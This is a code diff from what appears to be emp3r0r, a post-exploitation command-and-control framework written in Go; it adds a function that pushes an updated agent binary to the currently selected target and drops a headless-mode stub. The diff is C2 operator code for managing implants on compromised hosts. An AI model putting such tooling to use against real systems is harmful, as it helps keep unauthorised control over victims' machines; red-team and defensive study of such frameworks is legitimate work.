@@ -13,8 +13,10 @@ import (
 
 	"github.com/fatih/color"
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/olekukonko/tablewriter"
+	"github.com/spf13/cobra"
 )
 
 // CmdResults receive response from agent and cache them
@@ -47,12 +49,6 @@ func processAgentData(data *emp3r0r_def.MsgTunData) {
 	CmdResultsMutex.Lock()
 	CmdResults[cmd_id] = out
 	CmdResultsMutex.Unlock()
-
-	// headless mode
-	if IsAPIEnabled {
-		// TODO: API
-		return
-	}
 
 	switch cmd_slice[0] {
 	// screenshot command
@@ -184,4 +180,13 @@ func processAgentData(data *emp3r0r_def.MsgTunData) {
 			LogMsg("Command %s took %s", strconv.Quote(cmd), time_spent)
 		}
 	}
+}
+
+func UpgradeAgent(cmd *cobra.Command, args []string) {
+	if !util.IsExist(WWWRoot + "agent") {
+		LogError("%s/agent not found, build one with `use gen_agent` first", WWWRoot)
+		return
+	}
+	checksum := tun.SHA256SumFile(WWWRoot + "agent")
+	SendCmdToCurrentTarget(fmt.Sprintf("%s --checksum %s", emp3r0r_def.C2CmdUpdateAgent, checksum), "")
 }
